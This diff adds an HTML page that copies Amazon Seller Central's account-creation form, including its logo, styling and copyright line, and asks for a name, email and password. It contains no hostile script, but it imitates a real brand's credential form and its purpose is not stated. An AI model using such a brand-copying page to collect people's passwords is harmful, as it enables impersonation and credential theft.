@@ -1,0 +1,141 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title></title>
+    <meta id="i18n_pagename" content="create_account">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <link rel="stylesheet" type="text/css" href="css/login_public.css" />
+    <link rel="stylesheet" type="text/css" href="css/login.css" />
+</head>
+<body>
+    <div class="a-section a-padding-medium auth-workflow">
+        <div class="a-section a-spacing-none auth-navbar">
+            <div class="a-section a-spacing-medium a-text-center">
+                <img src="img/SellerCentral_Bliss._CB379405384_.png" alt="Amazon Seller Central">
+            </div>
+        </div>
+        <div id="authportal-center-section">
+            <div id="authportal-main-section">
+                <div class="auth-pagelet-container">
+                    <div class="a-spacing-base">
+                        <div class="a-box">
+                            <div class="a-box-inner a-padding-extra-large">
+                                <h1 class="a-spacing-small" data-i18n-text="_body_Caption">
+                                    
+                                </h1>
+                                <div class="a-row a-spacing-base">
+                                    <label for="ap_customer_name" class="a-form-label" data-i18n-text="_body_CustomerName">
+                                        
+                                    </label>
+                                    <input type="text" maxlength="50" id="ap_customer_name" autocomplete="off" name="customerName"
+                                        tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field auth-contact-verification-request-info">
+                                    <div id="auth-customerName-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini">
+                                        <div class="a-box-inner a-alert-container">
+                                            <i class="a-icon a-icon-alert"></i>
+                                            <div class="a-alert-content" data-i18n-text="_body_NameError">
+                                                
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="a-row a-spacing-base">
+                                    <label for="ap_email" class="a-form-label" data-i18n-text="_body_ApEmail">
+                                        
+                                    </label>
+                                    <input type="email" maxlength="64" id="ap_email" name="email" tabindex="3" class="a-input-text a-span12 auth-required-field auth-require-fields-match  auth-require-reverify-on-change auth-contact-verification-request-info">
+                                    <div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini">
+                                        <div class="a-box-inner a-alert-container">
+                                            <i class="a-icon a-icon-alert"></i>
+                                            <div class="a-alert-content" data-i18n-text="_body_EmailMissing">
+                                                
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="a-row a-spacing-base">
+                                    <div class="a-row">
+                                        <div class="a-column a-span5">
+                                            <label for="ap_password" class="a-form-label" data-i18n-text="_body_ApPassword">
+                                                
+                                            </label>
+                                        </div>
+                                    </div>
+                                    <input type="password" maxlength="1024" id="ap_password" autocomplete="off" placeholder="" data-i18n-placeholder="_body_PasswordPlaceholder"
+                                        name="password" tabindex="5" class="a-input-text a-form-normal a-span12 auth-required-field auth-require-fields-match  auth-require-password-validation">
+                                    <div class="a-box a-alert-inline a-alert-inline-info auth-inlined-information-message a-spacing-top-mini">
+                                        <div class="a-box-inner a-alert-container">
+                                            <i class="a-icon a-icon-alert"></i>
+                                            <div class="a-alert-content" data-i18n-text="_body_PasswordTip">
+                                                
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="a-row a-spacing-base">
+                                    <label for="ap_password_check" class="a-form-label" data-i18n-text="_body_ReEnterPassword">
+                                        
+                                    </label>
+                                    <input type="password" maxlength="1024" id="ap_password_check" autocomplete="off"
+                                        name="passwordCheck" tabindex="6" class="a-input-text a-form-normal a-span12 auth-required-field auth-require-fields-match">
+                                    <div id="auth-passwordCheck-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini">
+                                        <div class="a-box-inner a-alert-container">
+                                            <i class="a-icon a-icon-alert"></i>
+                                            <div class="a-alert-content" data-i18n-text="_body_ReEnterError">
+                                                
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="a-section a-spacing-extra-large">
+                                    <span class="a-button a-button-span12 a-button-primary" id="a-autoid-0"><span class="a-button-inner">
+                                        <input id="continue" tabindex="11" class="a-button-input" type="submit" aria-labelledby="a-autoid-0-announce">
+                                        <span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce" data-i18n-text="_body_Next">
+                                        </span></span></span>
+                                </div>
+                                <div class="a-divider a-divider-section">
+                                    <div class="a-divider-inner">
+                                    </div>
+                                </div>
+                                <div class="a-row"><span data-i18n-text="_body_Already"></span>
+                                     <a class="a-link-emphasis" href=login.html data-i18n-text="_body_Next"> </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="a-section a-spacing-top-extra-large auth-footer">
+            <div class="a-divider a-divider-section">
+                <div class="a-divider-inner">
+                </div>
+            </div>
+            <div class="a-section a-spacing-small a-text-center a-size-mini">
+                <span class="auth-footer-seperator"></span><a href="" class="a-link-normal" target="_blank">
+                    我要开店</a> <span class="auth-footer-seperator"></span><a href="" class="a-link-normal"
+                        target="_blank">亚马逊物流</a> <span class="auth-footer-seperator"></span><a href="" class="a-link-normal"
+                            target="_blank">Amazon Payments</a> <span class="auth-footer-seperator">
+                </span><a href="" class="a-link-normal" target="_blank">亚马逊广告</a> <span class="auth-footer-seperator">
+                </span><a href="" class="a-link-normal" target="_blank">在欧洲销售</a> <span class="auth-footer-seperator">
+                </span><a href="" class="a-link-normal" target="_blank">在日本销售</a> <span class="auth-footer-seperator">
+                </span><a href="" class="a-link-normal" target="_blank">帮助</a> <span class="auth-footer-seperator">
+                </span>
+                <div class="languageSwitcherDropdown a-section">
+                    <select class='languageSwitcherDropdownSelect' id='languageSwitcher'>
+                    </select>
+                </div>
+            </div>
+            <div class="a-section a-spacing-none a-text-center">
+                <span class="a-size-mini a-color-secondary">© 1996-2018, Amazon.com, Inc. or its affiliates
+                </span>
+            </div>
+        </div>
+    </div>
+</body>
+<script type="text/javascript" src="js/jquery-3.3.1.min.js"></script>
+<script type="text/javascript" src="js/public.js"></script>
+<script src="i18n/jquery.i18n.properties.js" type="text/javascript"></script>
+<script src="i18n/language.js" type="text/javascript"></script>
+</html>
